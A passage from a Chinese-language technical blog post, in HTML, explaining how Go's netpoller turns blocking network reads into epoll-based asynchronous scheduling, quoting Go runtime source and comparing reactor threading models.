scheduler</a>一文中我们讲述了go如何处理阻塞的系统调用，当goroutine调用阻塞的系统调用时，这个goroutine和物理线程都会一直处于阻塞状态，不能处理别的任务；而当goroutine调用channel阻塞时，goroutine会阻塞而物理线程不会阻塞，会继续执行别的任务。所以如果我们基于操作系统提供的阻塞的IO接口来构建golang的应用，我们就必须为每个处于阻塞读写状态的客户端建立一个线程。当面对高并发的包含大量处于阻塞IO状态的客户端时，将浪费大量的资源。而如果能够像channel那样处理，就可以避免资源浪费。</p>\n<p>Go的解决方案是如channel一般在用户层面(程序员层面)保留阻塞的接口，但是在Runtime内部采用非阻塞的异步接口来与操作系统交互。</p>\n<p>这里面关键的角色就是netpoller。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"netpoller\"><a href=\"#netpoller\" class=\"headerlink\" title=\"netpoller\"></a>netpoller</h2><p>netpoller的工作就是成为同步（阻塞）IO调用和异步（非阻塞）IO调用之间的桥梁。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">这里我为了简化概念，特意混淆了同步异步跟阻塞非阻塞的关系，使得二者等价得来看待，默认同步即使用了阻塞IO，异步即使用了非阻塞IO。</span><br><span class=\"line\">其实同步异步和阻塞非阻塞是有一些差异的，同步确实绝对的关联阻塞，但异步在某种场景下可以通过阻塞IO来实现的。</span><br><span class=\"line\">比如linux的文件IO都是阻塞的，那些异步IO库就会把读写文件的请求扔到一个线程池中去阻塞的读写，完成之后再进行回调。</span><br><span class=\"line\"></span><br><span class=\"line\">下面的总结来自：https://github.com/calidion/calidion.github.io/issues/40</span><br><span class=\"line\"></span><br><span class=\"line\">1. 同步异步分IO与代码两种。</span><br><span class=\"line\">2. 在IO上同步IO等于阻塞IO，异步IO等于非阻塞IO</span><br><span class=\"line\">3. 在代码上同步代码等同于调用同步IO，等同于调用阻塞IO；但并不表示异步代码一定有异步IO调用，从而也无法确定是不是一定是非阻塞IO。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"同步转异步调度\"><a href=\"#同步转异步调度\" class=\"headerlink\" title=\"同步转异步调度\"></a>同步转异步调度</h3><p>当goroutine发起一个同步调用比如下面的Read函数，经过一系列的调用，最后会进入gopark函数，gopark将当前正在执行的goroutine状态保存起来，然后切换到新的堆栈上执行新的goroutine。由于当前goroutine状态是被保存起来的，因此后面可以被恢复。这样调用Read的goroutine以为一直同步阻塞到现在，其实内部是异步完成的。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">func</span> (fd *netFD) <span class=\"built_in\">Read</span>(p []byte) (n <span class=\"keyword\">int</span>, err error) &#123;</span><br><span class=\"line\">\tn, err = fd.pfd.<span class=\"built_in\">Read</span>(p)</span><br><span class=\"line\">\truntime.<span class=\"built_in\">KeepAlive</span>(fd)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> n, <span class=\"built_in\">wrapSyscallError</span>(<span class=\"string\">&quot;read&quot;</span>, err)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Read implements io.Reader.</span></span><br><span class=\"line\"><span class=\"built_in\">func</span> (fd *FD) <span class=\"built_in\">Read</span>(p []byte) (<span class=\"keyword\">int</span>, error) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err := fd.<span class=\"built_in\">readLock</span>(); err != nil &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tdefer fd.<span class=\"built_in\">readUnlock</span>()</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(p) == <span class=\"number\">0</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// If the caller wanted a zero byte read, return immediately</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// without trying (but after acquiring the readLock).</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// Otherwise syscall.Read returns 0, nil which looks like</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// io.EOF.</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// TODO(bradfitz): make it wait for readability? (Issue 15735)</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>, nil</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err := fd.pd.<span class=\"built_in\">prepareRead</span>(fd.isFile); err != nil &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> fd.IsStream &amp;&amp; <span class=\"built_in\">len</span>(p) &gt; maxRW &#123;</span><br><span class=\"line\">\t\tp = p[:maxRW]</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> &#123;</span><br><span class=\"line\">\t\tn, err := syscall.<span class=\"built_in\">Read</span>(fd.Sysfd, p)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> err != nil &#123;</span><br><span class=\"line\">\t\t\tn = <span class=\"number\">0</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> err == syscall.EAGAIN &amp;&amp; fd.pd.<span class=\"built_in\">pollable</span>() &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> err = fd.pd.<span class=\"built_in\">waitRead</span>(fd.isFile); err == nil &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">continue</span></span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"comment\">// On MacOS we can see EINTR here if the user</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">// pressed ^Z.  See issue #22838.</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> runtime.GOOS == <span class=\"string\">&quot;darwin&quot;</span> &amp;&amp; err == syscall.EINTR &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">continue</span></span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\terr = fd.<span class=\"built_in\">eofError</span>(n, err)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> n, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">func</span> (pd *pollDesc) <span class=\"built_in\">waitRead</span>(isFile <span class=\"keyword\">bool</span>) error &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> pd.<span class=\"built_in\">wait</span>(<span class=\"string\">&#x27;r&#x27;</span>, isFile)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">func</span> (pd *pollDesc) <span class=\"built_in\">wait</span>(mode <span class=\"keyword\">int</span>, isFile <span class=\"keyword\">bool</span>) error &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> pd.runtimeCtx == <span class=\"number\">0</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> errors.<span class=\"built_in\">New</span>(<span class=\"string\">&quot;waiting for unsupported file type&quot;</span>)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tres := <span class=\"built_in\">runtime_pollWait</span>(pd.runtimeCtx, mode)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"built_in\">convertErr</span>(res, isFile)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//go:linkname poll_runtime_pollWait internal/poll.runtime_pollWait</span></span><br><span class=\"line\"><span class=\"function\">func <span class=\"title\">poll_runtime_pollWait</span><span class=\"params\">(pd *pollDesc, mode <span class=\"keyword\">int</span>)</span> <span class=\"keyword\">int</span> </span>&#123;</span><br><span class=\"line\">\terr := <span class=\"built_in\">netpollcheckerr</span>(pd, <span class=\"built_in\">int32</span>(mode))</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"number\">0</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// As for now only Solaris uses level-triggered IO.</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> GOOS == <span class=\"string\">&quot;solaris&quot;</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">netpollarm</span>(pd, mode)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> !<span class=\"built_in\">netpollblock</span>(pd, <span class=\"built_in\">int32</span>(mode), <span class=\"literal\">false</span>) &#123;</span><br><span class=\"line\">\t\terr = <span class=\"built_in\">netpollcheckerr</span>(pd, <span class=\"built_in\">int32</span>(mode))</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> err != <span class=\"number\">0</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> err</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"comment\">// Can happen if timeout has fired and unblocked us,</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// but before we had a chance to run, timeout has been reset.</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// Pretend it has not happened and retry.</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">func <span class=\"title\">netpollblock</span><span class=\"params\">(pd *pollDesc, mode int32, waitio <span class=\"keyword\">bool</span>)</span> <span class=\"keyword\">bool</span> </span>&#123;</span><br><span class=\"line\">\tgpp := &amp;pd.rg</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> mode == <span class=\"string\">&#x27;w&#x27;</span> &#123;</span><br><span class=\"line\">\t\tgpp = &amp;pd.wg</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// set the gpp semaphore to WAIT</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> &#123;</span><br><span class=\"line\">\t\told := *gpp</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> old == pdReady &#123;</span><br><span class=\"line\">\t\t\t*gpp = <span class=\"number\">0</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> old != <span class=\"number\">0</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\"><span class=\"keyword\">throw</span></span>(<span class=\"string\">&quot;runtime: double wait&quot;</span>)</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> atomic.<span class=\"built_in\">Casuintptr</span>(gpp, <span class=\"number\">0</span>, pdWait) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// need to recheck error states after setting gpp to WAIT</span></span><br><span class=\"line\">\t<span class=\"comment\">// this is necessary because runtime_pollUnblock/runtime_pollSetDeadline/deadlineimpl</span></span><br><span class=\"line\">\t<span class=\"comment\">// do the opposite: store to closing/rd/wd, membarrier, load of rg/wg</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> waitio || <span class=\"built_in\">netpollcheckerr</span>(pd, mode) == <span class=\"number\">0</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">gopark</span>(netpollblockcommit, unsafe.<span class=\"built_in\">Pointer</span>(gpp), <span class=\"string\">&quot;IO wait&quot;</span>, traceEvGoBlockNet, <span class=\"number\">5</span>)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// be careful to not lose concurrent READY notification</span></span><br><span class=\"line\">\told := atomic.<span class=\"built_in\">Xchguintptr</span>(gpp, <span class=\"number\">0</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> old &gt; pdWait &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\"><span class=\"keyword\">throw</span></span>(<span class=\"string\">&quot;runtime: corrupted polldesc&quot;</span>)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> old == pdReady</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Puts the current goroutine into a waiting state and calls unlockf.</span></span><br><span class=\"line\"><span class=\"comment\">// If unlockf returns false, the goroutine is resumed.</span></span><br><span class=\"line\"><span class=\"comment\">// unlockf must not access this G&#x27;s stack, as it may be moved between</span></span><br><span class=\"line\"><span class=\"comment\">// the call to gopark and the call to unlockf.</span></span><br><span class=\"line\"><span class=\"function\">func <span class=\"title\">gopark</span><span class=\"params\">(unlockf func(*g, unsafe.Pointer) <span class=\"keyword\">bool</span>, lock unsafe.Pointer, reason string, traceEv byte, traceskip <span class=\"keyword\">int</span>)</span> </span>&#123;</span><br><span class=\"line\">\tmp := <span class=\"built_in\">acquirem</span>()</span><br><span class=\"line\">\tgp := mp.curg</span><br><span class=\"line\">\tstatus := <span class=\"built_in\">readgstatus</span>(gp)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> status != _Grunning &amp;&amp; status != _Gscanrunning &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\"><span class=\"keyword\">throw</span></span>(<span class=\"string\">&quot;gopark: bad g status&quot;</span>)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tmp.waitlock = lock</span><br><span class=\"line\">\tmp.waitunlockf = *(*unsafe.Pointer)(unsafe.<span class=\"built_in\">Pointer</span>(&amp;unlockf))</span><br><span class=\"line\">\tgp.waitreason = reason</span><br><span class=\"line\">\tmp.waittraceev = traceEv</span><br><span class=\"line\">\tmp.waittraceskip = traceskip</span><br><span class=\"line\">\t<span class=\"built_in\">releasem</span>(mp)</span><br><span class=\"line\">\t<span class=\"comment\">// can&#x27;t do anything that might move the G between Ms here.</span></span><br><span class=\"line\">\t<span class=\"built_in\">mcall</span>(park_m)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// park continuation on g0.</span></span><br><span class=\"line\"><span class=\"function\">func <span class=\"title\">park_m</span><span class=\"params\">(gp *g)</span> </span>&#123;</span><br><span class=\"line\">\t_g_ := <span class=\"built_in\">getg</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> trace.enabled &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">traceGoPark</span>(_g_.m.waittraceev, _g_.m.waittraceskip)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">casgstatus</span>(gp, _Grunning, _Gwaiting)</span><br><span class=\"line\">\t<span class=\"built_in\">dropg</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> _g_.m.waitunlockf != nil &#123;</span><br><span class=\"line\">\t\tfn := *(*<span class=\"built_in\">func</span>(*g, unsafe.Pointer) <span class=\"keyword\">bool</span>)(unsafe.<span class=\"built_in\">Pointer</span>(&amp;_g_.m.waitunlockf))</span><br><span class=\"line\">\t\tok := <span class=\"built_in\">fn</span>(gp, _g_.m.waitlock)</span><br><span class=\"line\">\t\t_g_.m.waitunlockf = nil</span><br><span class=\"line\">\t\t_g_.m.waitlock = nil</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> !ok &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> trace.enabled &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">traceGoUnpark</span>(gp, <span class=\"number\">2</span>)</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">casgstatus</span>(gp, _Gwaiting, _Grunnable)</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">execute</span>(gp, <span class=\"literal\">true</span>) <span class=\"comment\">// Schedule it back, never returns.</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">schedule</span>()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"异步调度回来\"><a href=\"#异步调度回来\" class=\"headerlink\" title=\"异步调度回来\"></a>异步调度回来</h3><p>那什么时候G被调度回来呢？</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">schedule</span>() -&gt; <span class=\"built_in\">findrunnable</span>() -&gt; <span class=\"built_in\">netpoll</span>()</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// polls for ready network connections</span></span><br><span class=\"line\"><span class=\"comment\">// returns list of goroutines that become runnable</span></span><br><span class=\"line\"><span class=\"function\">func <span class=\"title\">netpoll</span><span class=\"params\">(block <span class=\"keyword\">bool</span>)</span> *g </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> epfd == <span class=\"number\">-1</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> nil</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\twaitms := <span class=\"built_in\">int32</span>(<span class=\"number\">-1</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> !block &#123;</span><br><span class=\"line\">\t\twaitms = <span class=\"number\">0</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvar events [<span class=\"number\">128</span>]epollevent</span><br><span class=\"line\">retry:</span><br><span class=\"line\">\tn := <span class=\"built_in\">epollwait</span>(epfd, &amp;events[<span class=\"number\">0</span>], <span class=\"built_in\">int32</span>(<span class=\"built_in\">len</span>(events)), waitms)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> n &lt; <span class=\"number\">0</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> n != -_EINTR &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">println</span>(<span class=\"string\">&quot;runtime: epollwait on fd&quot;</span>, epfd, <span class=\"string\">&quot;failed with&quot;</span>, -n)</span><br><span class=\"line\">\t\t\t<span class=\"built_in\"><span class=\"keyword\">throw</span></span>(<span class=\"string\">&quot;runtime: netpoll failed&quot;</span>)</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> retry</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvar gp guintptr</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i := <span class=\"built_in\">int32</span>(<span class=\"number\">0</span>); i &lt; n; i++ &#123;</span><br><span class=\"line\">\t\tev := &amp;events[i]</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ev.events == <span class=\"number\">0</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tvar mode int32</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ev.events&amp;(_EPOLLIN|_EPOLLRDHUP|_EPOLLHUP|_EPOLLERR) != <span class=\"number\">0</span> &#123;</span><br><span class=\"line\">\t\t\tmode += <span class=\"string\">&#x27;r&#x27;</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ev.events&amp;(_EPOLLOUT|_EPOLLHUP|_EPOLLERR) != <span class=\"number\">0</span> &#123;</span><br><span class=\"line\">\t\t\tmode += <span class=\"string\">&#x27;w&#x27;</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> mode != <span class=\"number\">0</span> &#123;</span><br><span class=\"line\">\t\t\tpd := *(**pollDesc)(unsafe.<span class=\"built_in\">Pointer</span>(&amp;ev.data))</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"built_in\">netpollready</span>(&amp;gp, pd, mode)</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> block &amp;&amp; gp == <span class=\"number\">0</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> retry</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> gp.<span class=\"built_in\">ptr</span>()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在某一次调度G的过程中，处于就绪状态的FD对应的G就会被调度回来。</p>\n<h3 id=\"何时注册的netpoller\"><a href=\"#何时注册的netpoller\" class=\"headerlink\" title=\"何时注册的netpoller\"></a>何时注册的netpoller</h3><p>在初始化的时候，最终调到netpollopen，里面调了epollctrl注册了fd上去。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">func (fd *netFD) init() error &#123;</span><br><span class=\"line\">\treturn fd.pfd.Init(fd.net, true)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">func (fd *FD) Init(net string, pollable bool) error &#123;</span><br><span class=\"line\">\t// We don&#x27;t actually care about the various network types.</span><br><span class=\"line\">\tif net == &quot;file&quot; &#123;</span><br><span class=\"line\">\t\tfd.isFile = true</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tif !pollable &#123;</span><br><span class=\"line\">\t\tfd.isBlocking = true</span><br><span class=\"line\">\t\treturn nil</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn fd.pd.init(fd)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">func (pd *pollDesc) init(fd *FD) error &#123;</span><br><span class=\"line\">\tserverInit.Do(runtime_pollServerInit)</span><br><span class=\"line\">\tctx, errno := runtime_pollOpen(uintptr(fd.Sysfd))</span><br><span class=\"line\">\tif errno != 0 &#123;</span><br><span class=\"line\">\t\tif ctx != 0 &#123;</span><br><span class=\"line\">\t\t\truntime_pollUnblock(ctx)</span><br><span class=\"line\">\t\t\truntime_pollClose(ctx)</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treturn syscall.Errno(errno)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tpd.runtimeCtx = ctx</span><br><span class=\"line\">\treturn nil</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">//go:linkname poll_runtime_pollOpen internal/poll.runtime_pollOpen</span><br><span class=\"line\">func poll_runtime_pollOpen(fd uintptr) (*pollDesc, int) &#123;</span><br><span class=\"line\">\tpd := pollcache.alloc()</span><br><span class=\"line\">\tlock(&amp;pd.lock)</span><br><span class=\"line\">\tif pd.wg != 0 &amp;&amp; pd.wg != pdReady &#123;</span><br><span class=\"line\">\t\tthrow(&quot;runtime: blocked write on free polldesc&quot;)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tif pd.rg != 0 &amp;&amp; pd.rg != pdReady &#123;</span><br><span class=\"line\">\t\tthrow(&quot;runtime: blocked read on free polldesc&quot;)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tpd.fd = fd</span><br><span class=\"line\">\tpd.closing = false</span><br><span class=\"line\">\tpd.seq++</span><br><span class=\"line\">\tpd.rg = 0</span><br><span class=\"line\">\tpd.rd = 0</span><br><span class=\"line\">\tpd.wg = 0</span><br><span class=\"line\">\tpd.wd = 0</span><br><span class=\"line\">\tunlock(&amp;pd.lock)</span><br><span class=\"line\"></span><br><span class=\"line\">\tvar errno int32</span><br><span class=\"line\">\terrno = netpollopen(fd, pd)</span><br><span class=\"line\">\treturn pd, int(errno)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">func netpollopen(fd uintptr, pd *pollDesc) int32 &#123;</span><br><span class=\"line\">\tvar ev epollevent</span><br><span class=\"line\">\tev.events = _EPOLLIN | _EPOLLOUT | _EPOLLRDHUP | _EPOLLET</span><br><span class=\"line\">\t*(**pollDesc)(unsafe.Pointer(&amp;ev.data)) = pd</span><br><span class=\"line\">\treturn -epollctl(epfd, _EPOLL_CTL_ADD, int32(fd), &amp;ev)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>上面可以看到fd在初始化的时候就注册了，这个时候Read()还没调用，waitRead()也没有调用，那么这时候在read和waitread调用之前有数据到来G被激活的话会怎么样呢？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">netpoll() -&gt; netpollready() -&gt; netpollunblock()</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">func netpollunblock(pd *pollDesc, mode int32, ioready bool) *g &#123;</span><br><span class=\"line\">\tgpp := &amp;pd.rg</span><br><span class=\"line\">\tif mode == &#x27;w&#x27; &#123;</span><br><span class=\"line\">\t\tgpp = &amp;pd.wg</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfor &#123;</span><br><span class=\"line\">\t\told := *gpp</span><br><span class=\"line\">\t\tif old == pdReady &#123;</span><br><span class=\"line\">\t\t\treturn nil</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tif old == 0 &amp;&amp; !ioready &#123;</span><br><span class=\"line\">\t\t\t// Only set READY for ioready. runtime_pollWait</span><br><span class=\"line\">\t\t\t// will check for timeout/cancel before waiting.</span><br><span class=\"line\">\t\t\treturn nil</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tvar new uintptr</span><br><span class=\"line\">\t\tif ioready &#123;</span><br><span class=\"line\">\t\t\tnew = pdReady</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tif atomic.Casuintptr(gpp, old, new) &#123;</span><br><span class=\"line\">\t\t\tif old == pdReady || old == pdWait &#123;</span><br><span class=\"line\">\t\t\t\told = 0</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\treturn (*g)(unsafe.Pointer(old))</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>netpollready负责把多个活跃的G串起来，netpollunblock则把G状态更新为pdReady并返回该G。</p>\n<p>可以看到由于waitRead调用前rg，wg字段是空的，所以这里old值是0，所以netpollunblock返回空指针，netpollready就不会把空指针串进去。</p>\n<p>所以waitread之前G被激活也不会有问题。</p>\n<h2 id=\"线程模型\"><a href=\"#线程模型\" class=\"headerlink\" title=\"线程模型\"></a>线程模型</h2><p>写过select和epoll的都能看出来go的netpoller就是基于epoll（linux上）的多路复用机制写出来的，基于epoll的线程设计要么是reactor，要么是proactor，而从go的代码可以看出，go的netpoll就是一种reactor的模型。使用reactor的线程模型通常包括下面的三大类：</p>\n<p>单loop：</p>\n<p><img src=\"/linkimage/gonetpoller/threadmodel1.png\" alt=\"single loop\"></p>\n<p>一组loop：</p>\n<p><img src=\"/linkimage/gonetpoller/threadmodel2.png\" alt=\"多loop\"></p>\n<p>双loop组：</p>\n<p><img src=\"/linkimage/gonetpoller/threadmodel3.png\" alt=\"双loop组\"></p>\n<p>图片来自<a href=\"https://www.infoq.cn/article/netty-threading-model\">Netty 系列之 Netty 线程模型</a></p>\n<p>三种模型依次适用于更大系统规模和更高复杂度的系统，golang由于是全局的netpoller，只有一个，因此属于第一种模型，当然go使用协程来调度任务，使得它在线程的调度上是优于上图任何一种的，但是在网络IO的性能上go并没有什么优势。</p>\n<h2 id=\"单loop的不足\"><a href=\"#单loop的不足\" class=\"headerlink\" title=\"单loop的不足\"></a>单loop的不足</h2><p>线程模型我们说适合的是最好的，它取决你的规模，你的业务模型等。但是就像libev作者说的<code>one loop per thread is usually a good model</code>(<a href=\"http://para.se/perldoc/EV/libev.html\">@Chapter:THREADS AND COROUTINES</a>),我也认同一个线程一个loop的设计。</p>\n<p>原因包括：多个loop可以更好的进行负载的分配、类型的分类，把连接均分到不同的loop可以做到负载均衡，而把不同类型的连接分到不同的loop就可以很好的进行连接分类；多个loop可以提升连接的响应速度，应对一些突发IO，可以降低延迟，在高并发的场景下会更有优势。</p>\n<p>采用<code>one loop per thread</code>设计的网络框架，C++中有Muduo，Java中有Netty，等。都是非常优秀的网络框架，采用单loop的go在这方面就会面临这方面的劣势，我认为go在这方面是需要有所改进的。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a 